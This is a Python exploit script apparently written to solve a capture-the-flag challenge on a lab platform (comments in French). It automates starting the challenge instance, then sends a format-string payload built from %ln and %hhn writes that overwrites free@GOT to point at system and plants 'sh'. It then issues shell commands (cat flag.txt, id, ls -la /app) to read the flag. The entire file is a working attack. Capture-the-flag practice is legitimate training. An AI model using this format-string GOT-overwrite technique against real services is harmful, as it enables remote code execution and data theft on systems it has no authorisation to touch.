import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

CID = 164
SYSTEM_PLT = 0x4006F0
SH = 0x00006873
PIVOTVAL = 0x00602018


def start_instance():
    cy = CyLab(delay=1.5)
    cy.login()
    cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
    for _ in range(12):
        time.sleep(2)
        st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
        try:
            d = json.loads(b)
        except Exception:
            continue
        txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
        if m and d.get("status") == "RUNNING":
            return m.group(1), int(m.group(2))
    return None, None


def pad(nconv, total):
    if nconv == 1:
        return b"%%%dc" % total
    return b"%c" * (nconv - 1) + b"%%%dc" % (total - (nconv - 1))


def build():
    p = pad(9, SH) + b"%ln"                                   # [10] Stonk: "sh"
    p += pad(1, PIVOTVAL - SH) + b"%ln"                       # [12] slot 20 = free@GOT
    need = 0xF0 - PIVOTVAL % 256
    while need < 6:
        need += 256
    p += pad(7, need) + b"%hhn"                               # [20] free@GOT[0] = 0xf0
    return p


def attempt(n):
    host, port = start_instance()
    if not host:
        print("[%d] instance KO" % n, flush=True)
        return None
    print("[%d] %s:%d" % (n, host, port), flush=True)
    payload = build()
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(2.0)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"1\n")
    time.sleep(0.35)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(payload + b"\n")
    t0 = time.time()
    total = 0
    buf = b""
    sent = False
    while time.time() - t0 < 900:
        try:
            d = s.recv(1 << 20)
        except socket.timeout:
            continue
        except Exception:
            break
        if not d:
            break
        total += len(d)
        buf = (buf + d)[-8192:]
        if not sent and b"Portfolio as of" in buf:
            # la boucle de view_portfolio a commence : free() va suivre
            time.sleep(1.0)
            s.sendall(b"cat api; cat api.txt; cat flag.txt; cat /app/api; id; ls -la /app\n")
            sent = True
            print("[%d] commande envoyee a t=%.0fs (%d o)" % (n, time.time() - t0, total), flush=True)
        if sent and (b"academy{" in buf or b"uid=" in buf):
            time.sleep(1)
            try:
                s.settimeout(3)
                buf = (buf + s.recv(1 << 20))[-65536:]
            except Exception:
                pass
            break
    s.close()
    print("[%d] %d octets, commande_envoyee=%s, en %.0fs" % (n, total, sent, time.time() - t0), flush=True)
    txt = buf.decode(errors="replace")
    i = txt.find("academy{")
    if i >= 0:
        flag = txt[i:txt.find("}", i) + 1]
        print("FLAG:", flag, flush=True)
        return flag
    print("--- fin ---", flush=True)
    print(repr(buf[-1200:]), flush=True)
    return None


if __name__ == "__main__":
    for i in range(1, 4):
        if attempt(i):
            break
